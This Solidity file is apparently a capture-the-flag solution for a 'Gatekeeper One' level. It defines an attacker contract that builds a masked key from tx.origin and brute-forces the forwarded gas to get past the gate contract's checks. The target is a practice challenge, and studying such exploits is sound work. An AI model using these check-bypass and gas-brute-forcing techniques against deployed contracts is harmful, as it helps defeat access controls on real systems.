// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";

contract Gatecrasher {
    GatekeeperOne immutable gate;

    constructor(address _gate) {
        gate = GatekeeperOne(_gate);
    }

    function crash() external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 8191; i++) {
            try gate.enter{gas: i + (8191 * 3)}(key) {
                break;
            } catch {}
        }
    }
}
